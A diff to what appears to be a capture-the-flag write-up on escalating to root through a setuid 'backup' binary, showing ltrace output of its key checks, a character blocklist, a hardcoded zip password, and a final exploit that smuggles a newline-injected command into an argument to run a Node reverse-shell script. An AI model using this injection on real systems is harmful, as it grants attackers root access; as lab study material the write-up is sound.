@@ -103,6 +103,63 @@ exit(1 <no return ...>
 +++ exited (status 1) +++
 Reverse engineering with radare 2 : r2 backup
 Followed by : aaa > afl > vvv
+The binary takes three agruments and it checks /etc/myplace/keys for the arguments:
+The command : ltrace -s 100 ./backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3
+From the output, we note it uses the system to zip the files => system("/usr/bin/zip -r -P magicword /tmp/.backup_405196991 3 > /dev/null"
+----------------------------------------------------------------
+strcat("/etc/myplace/key", "s")                                                             = "/etc/myplace/keys"
+fopen("/etc/myplace/keys", "r")                                                             = 0x8b8e5b0
+fgets("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", 1000, 0x8b8e5b0) = 0xffdf33cf
+strcspn("a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n", "\n")         = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508") = -1
+fgets("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", 1000, 0x8b8e5b0) = 0xffdf33cf
+strcspn("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n", "\n")         = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474") = 0
+strcpy(0xffdf2408, "Validated access token")                                                = 0xffdf2408
+printf(" %s[+]%s %s\n", "\033[32m", "\033[37m", "Validated access token" [+] Validated access token
+)                   = 38
+fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", 1000, 0x8b8e5b0) = 0xffdf33cf
+strcspn("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n", "\n")         = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110") = 1
+fgets("3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", 1000, 0x8b8e5b0)  = 0
+strstr("3", "..")                                                                           = nil
+strstr("3", "/root")                                                                        = nil
+strchr("3", ';')                                                                            = nil
+strchr("3", '&')                                                                            = nil
+strchr("3", '`')                                                                            = nil
+strchr("3", '$')                                                                            = nil
+strchr("3", '|')                                                                            = nil
+strstr("3", "//")                                                                           = nil
+strcmp("3", "/")                                                                            = 1
+strstr("3", "/etc")                                                                         = nil
+strcpy(0xffdf25fc, "3")                                                                     = 0xffdf25fc
+printf(" %s[+]%s Starting archiving %s\n", "\033[32m", "\033[37m", "3" [+] Starting archiving 3
+)                     = 36
+strcpy(0xffdf31db, "3")                                                                     = 0xffdf31db
+getpid()                                                                                    = 3078
+time(0)                                                                                     = 1619295776
+clock(0, 0, 0, 0)                                                                           = 4377
+srand(0x7c2301ff, 0xdb9aa229, 0x7c2301ff, 0x804918c)                                        = 0
+rand(0, 0, 0, 0)                                                                            = 0x1826d0bf
+sprintf("/tmp/.backup_405196991", "/tmp/.backup_%i", 405196991)                             = 22
+sprintf("/usr/bin/zip -r -P magicword /tmp/.backup_405196991 3 > /dev/null", "/usr/bin/zip -r -P magicword %s %s > /dev/null", "/tmp/.backup_405196991", "3") = 65
+system("/usr/bin/zip -r -P magicword /tmp/.backup_405196991 3 > /dev/null" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                      = 3072
+access("/tmp/.backup_405196991", 0)                                                         = -1
+strcpy(0xffdf2408, "The target path doesn't exist")                                         = 0xffdf2408
+printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "The target path doesn't exist" [!] The target path doesn't exist
+)            = 45
+puts("\n"
+
+)                                                                                  = 2
+remove("/tmp/.backup_405196991")                                                            = -1
+fclose(0x8b8e5b0)           
+-------------------------------------------
+The exploit as:
+/usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $'\n node /dev/shm/shell.js'
+And the root user is pawned!
 
 References:
 1. https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
